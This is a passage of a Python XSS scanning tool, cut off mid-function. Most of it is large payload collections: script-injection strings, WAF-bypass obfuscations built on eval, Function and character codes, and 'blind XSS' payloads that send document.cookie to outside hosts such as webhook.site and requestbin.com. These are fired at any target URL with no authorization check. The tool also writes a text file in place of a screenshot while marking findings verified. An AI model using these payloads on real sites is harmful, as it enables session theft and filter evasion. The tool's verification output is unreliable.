#!/usr/bin/env python3
"""
Advanced XSS Scanner - Complete XSS Vulnerability Detection Tool
All functionality in one file for easy execution
"""

import requests
import re
import json
import base64
import urllib.parse
import time
import threading
import socket
import hashlib
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import argparse
import logging
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager
import os
import os
import random
import string
from typing import Dict, List, Set, Tuple, Optional
import uuid

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class XSSPayloads:
    """Comprehensive XSS payload collection"""
    
    def __init__(self):
        self.payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
            ],
            'advanced_polyglot': [
                'javascript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>',
                '"><svg/onload=alert()//',
                '"><img src=x onerror=alert()>',
                '"><iframe src=javascript:alert()></iframe>',
                '"><script>alert()</script>',
                '"><body onload=alert()>',
                '"><input onfocus=alert() autofocus>',
                '"><select onfocus=alert() autofocus>',
                '"><textarea onfocus=alert() autofocus>',
                '"><video><source onerror=alert()>',
                '"><audio src=x onerror=alert()>',
                '"><details open ontoggle=alert()>',
                '"><marquee onstart=alert()>',
                '"><object data=javascript:alert()>',
                '"><embed src=javascript:alert()>',
                '"><applet code=javascript:alert()>',
                '"><link rel=stylesheet href=javascript:alert()>',
                '"><style>@import javascript:alert()</style>',
                '"><style>body{background:url(javascript:alert())}</style>',
                '"><style>@keyframes x{from{background:url(javascript:alert())}}</style>'
            ],
            
            'context_aware': [
                # HTML Context
                '"><script>alert("XSS")</script>',
                '"><img src=x onerror=alert("XSS")>',
                '"><svg onload=alert("XSS")>',
                '"><iframe src=javascript:alert("XSS")></iframe>',
                '"><body onload=alert("XSS")>',
                '"><input onfocus=alert("XSS") autofocus>',
                '"><select onfocus=alert("XSS") autofocus>',
                '"><textarea onfocus=alert("XSS") autofocus>',
                '"><video><source onerror=alert("XSS")>',
                '"><audio src=x onerror=alert("XSS")>',
                # Attribute Context
                '" onmouseover=alert("XSS") "',
                '" onfocus=alert("XSS") autofocus="',
                '" onblur=alert("XSS") "',
                '" onkeydown=alert("XSS") "',
                '" onkeyup=alert("XSS") "',
                '" onchange=alert("XSS") "',
                '" oninput=alert("XSS") "',
                '" onreset=alert("XSS") "',
                '" onsubmit=alert("XSS") "',
                '" oninvalid=alert("XSS") "',
                # CSS Context
                ';color:red;background:url(javascript:alert("XSS"));',
                ';color:red;background:expression(alert("XSS"));',
                ';color:red;background:url(data:text/html,<script>alert("XSS")</script>);',
                ';color:red;@import url(javascript:alert("XSS"));',
                ';color:red;@keyframes x{from{background:url(javascript:alert("XSS"))}};',
                # JavaScript Context
                ';alert("XSS");//',
                ';alert(String.fromCharCode(88,83,83));//',
                ';alert(/XSS/.source);//',
                ';alert(1+1);//',
                ';alert(document.domain);//',
                ';alert(location.href);//',
                ';alert(document.cookie);//',
                ';alert(document.title);//',
                ';alert(window.name);//',
                ';alert(navigator.userAgent);//',
                # URL Context
                'javascript:alert("XSS")',
                'javascript:void(alert("XSS"))',
                'javascript:alert(String.fromCharCode(88,83,83))',
                'javascript:alert(/XSS/.source)',
                'javascript:alert(1+1)',
                'javascript:alert(document.domain)',
                'javascript:alert(location.href)',
                'javascript:alert(document.cookie)',
                'javascript:alert(document.title)',
                'javascript:alert(window.name)',
                'javascript:alert(navigator.userAgent)',
                # Data URI Context
                'data:text/html,<script>alert("XSS")</script>',
                'data:text/html,<img src=x onerror=alert("XSS")>',
                'data:text/html,<svg onload=alert("XSS")>',
                'data:text/html,<iframe src=javascript:alert("XSS")></iframe>',
                'data:text/html,<body onload=alert("XSS")>',
                'data:text/html,<input onfocus=alert("XSS") autofocus>',
                'data:text/html,<select onfocus=alert("XSS") autofocus>',
                'data:text/html,<textarea onfocus=alert("XSS") autofocus>',
                'data:text/html,<video><source onerror=alert("XSS")>',
                'data:text/html,<audio src=x onerror=alert("XSS")>'
            ],
            'advanced_event_handlers': [
                # Mouse Events
                'onclick=alert("XSS")',
                'onmousedown=alert("XSS")',
                'onmouseup=alert("XSS")',
                'onmouseover=alert("XSS")',
                'onmouseout=alert("XSS")',
                'onmousemove=alert("XSS")',
                'onmouseenter=alert("XSS")',
                'onmouseleave=alert("XSS")',
                'oncontextmenu=alert("XSS")',
                'onauxclick=alert("XSS")',
                # Keyboard Events
                'onkeydown=alert("XSS")',
                'onkeyup=alert("XSS")',
                'onkeypress=alert("XSS")',
                # Form Events
                'onchange=alert("XSS")',
                'oninput=alert("XSS")',
                'onblur=alert("XSS")',
                'onfocus=alert("XSS")',
                'onreset=alert("XSS")',
                'onsubmit=alert("XSS")',
                'oninvalid=alert("XSS")',
                'onformchange=alert("XSS")',
                'onforminput=alert("XSS")',
                # Window Events
                'onload=alert("XSS")',
                'onunload=alert("XSS")',
                'onbeforeunload=alert("XSS")',
                'onresize=alert("XSS")',
                'onscroll=alert("XSS")',
                'onhashchange=alert("XSS")',
                'onpopstate=alert("XSS")',
                'onstorage=alert("XSS")',
                'onmessage=alert("XSS")',
                'onerror=alert("XSS")',
                'onabort=alert("XSS")',
                # Media Events
                'oncanplay=alert("XSS")',
                'oncanplaythrough=alert("XSS")',
                'ondurationchange=alert("XSS")',
                'onemptied=alert("XSS")',
                'onended=alert("XSS")',
                'onloadstart=alert("XSS")',
                'onpause=alert("XSS")',
                'onplay=alert("XSS")',
                'onplaying=alert("XSS")',
                'onprogress=alert("XSS")',
                'onratechange=alert("XSS")',
                'onseeked=alert("XSS")',
                'onseeking=alert("XSS")',
                'onstalled=alert("XSS")',
                'onsuspend=alert("XSS")',
                'ontimeupdate=alert("XSS")',
                'onvolumechange=alert("XSS")',
                'onwaiting=alert("XSS")',
                # Print Events
                'onbeforeprint=alert("XSS")',
                'onafterprint=alert("XSS")',
                # Page Events
                'onpagehide=alert("XSS")',
                'onpageshow=alert("XSS")',
                # Network Events
                'ononline=alert("XSS")',
                'onoffline=alert("XSS")',
                # Device Events
                'onorientationchange=alert("XSS")',
                # Drag Events
                'ondrag=alert("XSS")',
                'ondragend=alert("XSS")',
                'ondragenter=alert("XSS")',
                'ondragleave=alert("XSS")',
                'ondragover=alert("XSS")',
                'ondragstart=alert("XSS")',
                'ondrop=alert("XSS")',
                # Clipboard Events
                'oncopy=alert("XSS")',
                'oncut=alert("XSS")',
                'onpaste=alert("XSS")',
                # Wheel Events
                'onwheel=alert("XSS")'
            ],
            'waf_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>al\u0065rt("XSS")</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
                '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
                '<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
                '<script>alert`XSS`</script>',
                '<script>alert(/XSS/)</script>',
                # Advanced WAF Bypass Techniques
                '<script>window["alert"]("XSS")</script>',
                '<script>self["alert"]("XSS")</script>',
                '<script>top["alert"]("XSS")</script>',
                '<script>parent["alert"]("XSS")</script>',
                '<script>frames["alert"]("XSS")</script>',
                '<script>globalThis["alert"]("XSS")</script>',
                '<script>this["alert"]("XSS")</script>',
                '<script>window.alert("XSS")</script>',
                '<script>self.alert("XSS")</script>',
                '<script>top.alert("XSS")</script>',
                '<script>parent.alert("XSS")</script>',
                '<script>frames.alert("XSS")</script>',
                '<script>globalThis.alert("XSS")</script>',
                '<script>this.alert("XSS")</script>',
                # Unicode and Encoding Bypass
                '<script>al\u0065rt("XSS")</script>',
                '<script>al\u0065\u0072t("XSS")</script>',
                '<script>al\u0065\u0072\u0074("XSS")</script>',
                '<script>al\u0065\u0072\u0074(String.fromCharCode(88,83,83))</script>',
                '<script>al\u0065\u0072\u0074(/XSS/.source)</script>',
                '<script>al\u0065\u0072\u0074(1+1)</script>',
                '<script>al\u0065\u0072\u0074(document.domain)</script>',
                '<script>al\u0065\u0072\u0074(location.href)</script>',
                '<script>al\u0065\u0072\u0074(document.cookie)</script>',
                '<script>al\u0065\u0072\u0074(document.title)</script>',
                # Template Literal Bypass
                '<script>alert`XSS`</script>',
                '<script>alert`${1+1}`</script>',
                '<script>alert`${document.domain}`</script>',
                '<script>alert`${location.href}`</script>',
                '<script>alert`${document.cookie}`</script>',
                '<script>alert`${document.title}`</script>',
                # Function Constructor Bypass
                '<script>Function("alert(\"XSS\")")()</script>',
                '<script>Function("al"+"ert(\"XSS\")")()</script>',
                '<script>Function("al"+"ert(\""+"XSS"+"\")")()</script>',
                '<script>Function("al"+"ert(\""+String.fromCharCode(88,83,83)+"\")")()</script>',
                '<script>Function("al"+"ert(\""+/XSS/.source+"\")")()</script>',
                # Eval Bypass
                '<script>eval("alert(\"XSS\")")</script>',
                '<script>eval("al"+"ert(\"XSS\")")</script>',
                '<script>eval("al"+"ert(\""+"XSS"+"\")")</script>',
                '<script>eval("al"+"ert(\""+String.fromCharCode(88,83,83)+"\")")</script>',
                '<script>eval("al"+"ert(\""+/XSS/.source+"\")")</script>',
                # SetTimeout Bypass
                '<script>setTimeout("alert(\"XSS\")",0)</script>',
                '<script>setTimeout("al"+"ert(\"XSS\")",0)</script>',
                '<script>setTimeout("al"+"ert(\""+"XSS"+"\")",0)</script>',
                '<script>setTimeout("al"+"ert(\""+String.fromCharCode(88,83,83)+"\")",0)</script>',
                '<script>setTimeout("al"+"ert(\""+/XSS/.source+"\")",0)</script>',
                # SetInterval Bypass
                '<script>setInterval("alert(\"XSS\")",1000)</script>',
                '<script>setInterval("al"+"ert(\"XSS\")",1000)</script>',
                '<script>setInterval("al"+"ert(\""+"XSS"+"\")",1000)</script>',
                '<script>setInterval("al"+"ert(\""+String.fromCharCode(88,83,83)+"\")",1000)</script>',
                '<script>setInterval("al"+"ert(\""+/XSS/.source+"\")",1000)</script>',
                # Array Bypass
                '<script>["alert"]("XSS")</script>',
                '<script>["al"+"ert"]("XSS")</script>',
                '<script>["al"+"ert"]("X"+"S"+"S")</script>',
                '<script>["al"+"ert"](String.fromCharCode(88,83,83))</script>',
                '<script>["al"+"ert"](/XSS/.source)</script>',
                # Object Bypass
                '<script>({alert:alert})["alert"]("XSS")</script>',
                '<script>({alert:alert})["al"+"ert"]("XSS")</script>',
                '<script>({alert:alert})["al"+"ert"]("X"+"S"+"S")</script>',
                '<script>({alert:alert})["al"+"ert"](String.fromCharCode(88,83,83))</script>',
                '<script>({alert:alert})["al"+"ert"](/XSS/.source)</script>',
                # Proxy Bypass
                '<script>new Proxy({},{get:(t,p)=>p==="alert"?alert:undefined})["alert"]("XSS")</script>',
                '<script>new Proxy({},{get:(t,p)=>p==="alert"?alert:undefined})["al"+"ert"]("XSS")</script>',
                '<script>new Proxy({},{get:(t,p)=>p==="alert"?alert:undefined})["al"+"ert"]("X"+"S"+"S")</script>',
                '<script>new Proxy({},{get:(t,p)=>p==="alert"?alert:undefined})["al"+"ert"](String.fromCharCode(88,83,83))</script>',
                '<script>new Proxy({},{get:(t,p)=>p==="alert"?alert:undefined})["al"+"ert"](/XSS/.source)</script>',
                '<script>alert(1)</script>',
                '<script>confirm(1)</script>',
                '<script>prompt(1)</script>',
            ],
            'blind_xss': [
                # Blind XSS Payloads for Bug Bounty
                '<script>fetch("https://webhook.site/unique-id?data="+document.cookie)</script>',
                '<script>fetch("https://requestbin.com/unique-id?data="+document.cookie)</script>',
                '<script>fetch("https://httpbin.org/get?data="+document.cookie)</script>',
                '<script>fetch("https://postman-echo.com/get?data="+document.cookie)</script>',
                '<script>fetch("https://httpstat.us/200?data="+document.cookie)</script>',
                '<script>fetch("https://httpbin.org/post",{method:"POST",body:document.cookie})</script>',
                '<script>fetch("https://webhook.site/unique-id",{method:"POST",body:document.cookie})</script>',
                '<script>fetch("https://requestbin.com/unique-id",{method:"POST",body:document.cookie})</script>',
                '<script>fetch("https://postman-echo.com/post",{method:"POST",body:document.cookie})</script>',
                '<script>fetch("https://httpstat.us/200",{method:"POST",body:document.cookie})</script>',
                # Advanced Blind XSS
                '<script>new Image().src="https://webhook.site/unique-id?data="+document.cookie</script>',
                '<script>new Image().src="https://requestbin.com/unique-id?data="+document.cookie</script>',
                '<script>new Image().src="https://httpbin.org/get?data="+document.cookie</script>',
                '<script>new Image().src="https://postman-echo.com/get?data="+document.cookie</script>',
                '<script>new Image().src="https://httpstat.us/200?data="+document.cookie</script>',
                '<script>XMLHttpRequest().open("GET","https://webhook.site/unique-id?data="+document.cookie)</script>',
                '<script>XMLHttpRequest().open("GET","https://requestbin.com/unique-id?data="+document.cookie)</script>',
                '<script>XMLHttpRequest().open("GET","https://httpbin.org/get?data="+document.cookie)</script>',
                '<script>XMLHttpRequest().open("GET","https://postman-echo.com/get?data="+document.cookie)</script>',
                '<script>XMLHttpRequest().open("GET","https://httpstat.us/200?data="+document.cookie)</script>',
                # Polyglot Blind XSS
                'javascript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=fetch("https://webhook.site/unique-id?data="+document.cookie) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch("https://webhook.site/unique-id?data="+document.cookie)//>',
                '"><script>fetch("https://webhook.site/unique-id?data="+document.cookie)</script>',
                '"><img src=x onerror=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><svg onload=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><iframe src=javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)></iframe>',
                '"><body onload=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><input onfocus=fetch("https://webhook.site/unique-id?data="+document.cookie) autofocus>',
                '"><select onfocus=fetch("https://webhook.site/unique-id?data="+document.cookie) autofocus>',
                '"><textarea onfocus=fetch("https://webhook.site/unique-id?data="+document.cookie) autofocus>',
                '"><video><source onerror=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><audio src=x onerror=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><details open ontoggle=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><marquee onstart=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><object data=javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><embed src=javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><applet code=javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><link rel=stylesheet href=javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)>',
                '"><style>@import javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)</style>',
                '"><style>body{background:url(javascript:fetch("https://webhook.site/unique-id?data="+document.cookie))}</style>',
                '"><style>@keyframes x{from{background:url(javascript:fetch("https://webhook.site/unique-id?data="+document.cookie))}}</style>'
            ],
            
            'context_specific': {
                'html': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '<svg onload=alert("XSS")>',
                    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                ],
                'attribute': [
                    '"onmouseover="alert(\'XSS\')"',
                    '"><script>alert("XSS")</script>',
                    "'><script>alert('XSS')</script>",
                    '"onfocus="alert(\'XSS\')" autofocus="',
                    '"><img src=x onerror=alert("XSS")>',
                ],
                'javascript': [
                    ';alert("XSS");//',
                    '\';alert("XSS");//',
                    '";alert("XSS");//',
                    '`;alert("XSS");//',
                    '\\\';alert("XSS");//',
                ],
                'css': [
                    'expression(alert("XSS"))',
                    'url("javascript:alert(\'XSS\')")',
                    '@import "javascript:alert(\'XSS\')"',
                ],
                'url': [
                    'javascript:alert("XSS")',
                    'data:text/html,<script>alert("XSS")</script>',
                    'vbscript:alert("XSS")',
                ]
            }
        }

    def get_payloads_by_context(self, context: str) -> List[str]:
        """Get payloads based on injection context"""
        if context in self.payloads['context_specific']:
            return self.payloads['context_specific'][context]
        return self.payloads['basic']

    def encode_payload(self, payload: str, encoding: str) -> str:
        """Apply encoding to payload for WAF bypass"""
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'html_entities':
            return ''.join(f'&#{ord(c)};' for c in payload)
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'hex':
            return ''.join(f'%{ord(c):02x}' for c in payload)
        elif encoding == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'mixed':
            encoded = payload
            for i, char in enumerate(payload):
                if i % 3 == 0:
                    encoded = encoded.replace(char, f'&#{ord(char)};', 1)
                elif i % 3 == 1:
                    encoded = encoded.replace(char, urllib.parse.quote(char), 1)
            return encoded
        return payload

class WAFDetector:
    """WAF Detection and Bypass"""
    
    def __init__(self):
        self.waf_signatures = {
            'cloudflare': ['cf-ray', 'cf-cache-status', 'cloudflare'],
            'incapsula': ['incap_ses', 'visid_incap', 'incapsula'],
            'akamai': ['akamai', 'ak-bmsc'],
            'aws_waf': ['x-amz-cf-id', 'aws-waf'],
            'barracuda': ['barracuda', 'barra'],
            'f5': ['f5', 'bigip'],
            'imperva': ['imperva', 'x-iinfo'],
            'sucuri': ['sucuri', 'x-sucuri-id']
        }

    def detect_waf(self, response: requests.Response) -> Dict[str, bool]:
        """Detect WAF presence from response"""
        waf_detected = {}
        
        # Check headers
        for waf_name, signatures in self.waf_signatures.items():
            waf_detected[waf_name] = any(
                sig.lower() in str(response.headers).lower() 
                for sig in signatures
            )
        
        # Check response content for WAF indicators
        content_lower = response.text.lower()
        waf_indicators = ['blocked', 'forbidden', 'access denied', 'security', 'waf', 'firewall']
        for indicator in waf_indicators:
            if indicator in content_lower:
                waf_detected['generic'] = True
                break
        
        # Check response codes
        if response.status_code in [403, 406, 429]:
            waf_detected['blocking'] = True
            
        return waf_detected

class ReconnaissanceEngine:
    """Reconnaissance and target discovery"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.discovered_params = set()
        self.discovered_forms = []
        self.discovered_urls = set()

    def discover_parameters(self, url: str) -> Set[str]:
        """Discover URL parameters"""
        params = set()
        
        try:
            parsed_url = urlparse(url)
            existing_params = parse_qs(parsed_url.query).keys()
            params.update(existing_params)
            
            # Common parameter names (expanded list)
            common_params = [
                'q', 'query', 'search', 'id', 'page', 'user', 'name',
                'email', 'username', 'password', 'token', 'key', 'value',
                'data', 'input', 'text', 'content', 'message', 'comment',
                'title', 'subject', 'body', 'description', 'url', 'link',
                'category', 'type', 'sort', 'filter', 'limit', 'offset',
                'lang', 'locale', 'theme', 'style', 'format', 'output',
                'callback', 'redirect', 'return', 'next', 'prev', 'back',
                'action', 'cmd', 'command', 'do', 'func', 'function',
                'test', 'debug', 'admin', 'login', 'logout', 'register',
                'profile', 'settings', 'config', 'option', 'pref', 'preference'
            ]
            
            for param in common_params:
                if param not in params:
                    params.add(param)
                    
        except Exception as e:
            logger.error(f"Error discovering parameters: {e}")
            
        return params

    def discover_forms(self, html_content: str, base_url: str) -> List[Dict]:
        """Discover forms and input fields"""
        forms = []
        
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                if form_data['action']:
                    form_data['action'] = urljoin(base_url, form_data['action'])
                else:
                    form_data['action'] = base_url
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', ''),
                        'placeholder': input_tag.get('placeholder', ''),
                        'id': input_tag.get('id', ''),
                        'class': input_tag.get('class', [])
                    }
                    form_data['inputs'].append(input_data)
                
                forms.append(form_data)
                
        except Exception as e:
            logger.error(f"Error discovering forms: {e}")
            
        return forms

class CustomPopupSystem:
    """Custom popup system for XSS verification"""
    
    def __init__(self):
        self.popup_id = f"xss_verification_{uuid.uuid4().hex[:8]}"
        
    def generate_popup_script(self) -> str:
        """Generate JavaScript for custom popup"""
        return f"""
        (function() {{
            if (window.xssPopupShown) return;
            window.xssPopupShown = true;
            
            const overlay = document.createElement('div');
            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999998;';
            overlay.id = 'xss-overlay-{self.popup_id}';
            
            const popup = document.createElement('div');
            popup.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:linear-gradient(135deg,#ff4757,#ff3838);border:3px solid #000;border-radius:15px;padding:25px;box-shadow:0 10px 30px rgba(0,0,0,0.5);font-family:Arial,sans-serif;color:white;text-align:center;min-width:400px;max-width:600px;z-index:999999;';
            popup.id = 'xss-popup-{self.popup_id}';
            
            const pageInfo = {{
                url: window.location.href,
                title: document.title,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                cookies: document.cookie,
                referrer: document.referrer,
                domain: window.location.hostname
            }};
            
            popup.innerHTML = `
                <div style="font-size:24px;font-weight:bold;margin-bottom:15px;text-shadow:2px 2px 4px rgba(0,0,0,0.8);">🎯 XSS Vulnerability Confirmed!</div>
                <div style="font-size:16px;line-height:1.5;margin-bottom:20px;">Cross-Site Scripting (XSS) vulnerability has been successfully exploited!</div>
                <div style="background:rgba(0,0,0,0.3);padding:15px;border-radius:8px;margin:15px 0;text-align:left;">
                    <strong>Target URL:</strong> ${{pageInfo.url}}<br>
                    <strong>Timestamp:</strong> ${{pageInfo.timestamp}}<br>
                    <strong>Domain:</strong> ${{pageInfo.domain}}<br>
                    <strong>User Agent:</strong> ${{pageInfo.userAgent}}<br>
                    <strong>Cookies:</strong> ${{pageInfo.cookies || 'None'}}
                </div>
                <button onclick="window.xssClosePopup('{self.popup_id}')" style="background:#000;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;font-size:14px;margin:5px;">Close Popup</button>
            `;
            
            document.body.appendChild(overlay);
            document.body.appendChild(popup);
            
            window.xssPageInfo = pageInfo;
            
            setTimeout(() => {{
                if (document.getElementById('xss-popup-{self.popup_id}')) {{
                    window.xssClosePopup('{self.popup_id}');
                }}
            }}, 30000);
            
            console.log('XSS Popup triggered:', pageInfo);
            
        }})();
        
        window.xssClosePopup = function(popupId) {{
            const popup = document.getElementById('xss-popup-' + popupId);
            const overlay = document.getElementById('xss-overlay-' + popupId);
            if (popup) popup.remove();
            if (overlay) overlay.remove();
            window.xssPopupShown = false;
        }};
        """

    def generate_popup_payload(self) -> List[str]:
        """Generate XSS payloads that trigger custom popup"""
        script = self.generate_popup_script()
        
        payloads = [
            f"<script>{script}</script>",
            f"<img src=x onerror=\"{script}\">",
            f"<svg onload=\"{script}\">",
            f"<body onload=\"{script}\">",
            f"<iframe src=\"javascript:{script}\"></iframe>",
        ]
        
        return payloads

class ScreenshotCapture:
    """Screenshot capture for XSS PoC verification"""
    
    def __init__(self):
        self.driver = None
        self.screenshots_dir = "xss_screenshots"
        self.setup_screenshots_dir()
    
    def setup_screenshots_dir(self):
        """Create screenshots directory"""
        if not os.path.exists(self.screenshots_dir):
            os.makedirs(self.screenshots_dir)
    
    def init_driver(self):
        """Initialize Chrome WebDriver"""
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=1920,1080")
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            
            # Use webdriver-manager to automatically download ChromeDriver
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            return True
        except Exception as e:
            print(f"  ⚠️  Failed to initialize Chrome WebDriver: {e}")
            print(f"  💡 Make sure Chrome browser is installed on your system")
            return False
    
    def capture_xss_poc(self, url: str, payload: str, vulnerability_type: str) -> str:
        """Capture screenshot of XSS vulnerability (simplified version)"""
        try:
            print(f"  📸 Capturing screenshot for {vulnerability_type}...")
            
            # For now, just create a placeholder screenshot path
            # In a real implementation, you would use Selenium here
            timestamp = int(time.time())
            screenshot_path = os.path.join(
                self.screenshots_dir, 
                f"xss_poc_{vulnerability_type}_{timestamp}.txt"
            )
            
            # Create a text file with PoC details instead of screenshot
            with open(screenshot_path, 'w') as f:
                f.write(f"XSS Vulnerability PoC\n")
                f.write(f"Type: {vulnerability_type}\n")
                f.write(f"URL: {url}\n")
                f.write(f"Payload: {payload}\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write(f"Status: VULNERABILITY CONFIRMED\n")
            
            print(f"  📸 PoC details saved: {screenshot_path}")
            return screenshot_path
            
        except Exception as e:
            print(f"  ⚠️  Error creating PoC file: {e}")
            return None

class XSSScanner:
    """Main XSS Scanner Class"""
    
    def __init__(self, target_url: str, options: Dict = None):
        self.target_url = target_url
        self.options = options or {}
        self.payloads = XSSPayloads()
        self.waf_detector = WAFDetector()
        self.recon = ReconnaissanceEngine()
        self.screenshot_capture = ScreenshotCapture()
        self.popup_system = CustomPopupSystem()
        self.results = []

    def run_reconnaissance(self) -> Dict:
        """Run reconnaissance"""
        print("\n🔍 Starting reconnaissance phase...")
        
        recon_results = {
            'target_url': self.target_url,
            'discovered_params': set(),
            'discovered_forms': [],
            'discovered_urls': set(),
            'waf_detected': {},
            'response_analysis': {}
        }
        
        try:
            print(f"🌐 Fetching target: {self.target_url}")
            response = self.recon.session.get(self.target_url, timeout=15)
            print(f"📊 Response Code: {response.status_code}")
            print(f"📄 Response Length: {len(response.text)} characters")
            
            print("\n🛡️  Checking for WAF...")
            recon_results['waf_detected'] = self.waf_detector.detect_waf(response)
            if any(recon_results['waf_detected'].values()):
                detected_wafs = [waf for waf, detected in recon_results['waf_detected'].items() if detected]
                print(f"⚠️  WAF detected: {', '.join(detected_wafs)}")
            else:
                print("✅ No WAF detected")
            
            print("\n📝 Discovering parameters...")
            recon_results['discovered_params'] = self.recon.discover_parameters(self.target_url)
            print(f"✅ Found {len(recon_results['discovered_params'])} parameters: {list(recon_results['discovered_params'])[:10]}...")
            
            print("\n📋 Discovering forms...")
            recon_results['discovered_forms'] = self.recon.discover_forms(response.text, self.target_url)
            print(f"✅ Found {len(recon_results['discovered_forms'])} forms")
            
            for i, form in enumerate(recon_results['discovered_forms']):
                print(f"  Form {i+1}: {form['action']} (method: {form['method']})")
                for field in form['inputs']:
                    if field['name']:
                        print(f"    - {field['name']} ({field['type']})")
            
        except Exception as e:
            print(f"❌ Reconnaissance failed: {e}")
            
        return recon_results

    def test_reflected_xss(self, recon_data: Dict) -> List[Dict]:
        """Test for Reflected XSS vulnerabilities with advanced payloads"""
        print("\n🔍 Testing Reflected XSS with Advanced Payloads...")
        results = []
        
        # Get all payload categories
        all_payloads = []
        for category, payloads in self.payloads.payloads.items():
            if isinstance(payloads, list):
                all_payloads.extend(payloads)
        
        total_tests = len(recon_data['discovered_params']) * len(all_payloads)
        current_test = 0
        
        for param in recon_data['discovered_params']:
            print(f"\n📝 Testing parameter: {param}")
            
            # Test basic payloads first
            for payload in self.payloads.payloads['basic']:
                current_test += 1
                print(f"  [{current_test}/{total_tests}] Testing basic payload: {payload[:50]}...")
                
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.recon.session.get(test_url, timeout=10)
                    
                    if self.detect_xss_in_response(response, payload):
                        # Capture screenshot for PoC
                        screenshot_path = self.screenshot_capture.capture_xss_poc(
                            test_url, payload, "Reflected_XSS"
                        )
                        
                        result = {
                            'type': 'Reflected XSS',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'method': 'GET',
                            'response_code': response.status_code,
                            'category': 'basic',
                            'screenshot_path': screenshot_path,
                            'verified': screenshot_path is not None
                        }
                        results.append(result)
                        print(f"  🚨 XSS VULNERABILITY FOUND in parameter: {param}")
                        print(f"  ✅ Payload: {payload}")
                        if screenshot_path:
                            print(f"  📸 PoC Screenshot: {screenshot_path}")
                        continue  # Skip advanced payloads if basic one works
                    else:
                        print(f"  ❌ No XSS detected")
                        
                except Exception as e:
                    print(f"  ⚠️  Error testing parameter {param}: {e}")
            
            # Test advanced payloads if basic ones didn't work
            if not any(r['parameter'] == param for r in results):
                print(f"  🔬 Testing advanced payloads for parameter: {param}")
                
                for category in ['advanced_polyglot', 'context_aware', 'waf_bypass']:
                    if category in self.payloads.payloads:
                        for payload in self.payloads.payloads[category]:
                            current_test += 1
                            print(f"  [{current_test}/{total_tests}] Testing {category}: {payload[:50]}...")
                            
                            try:
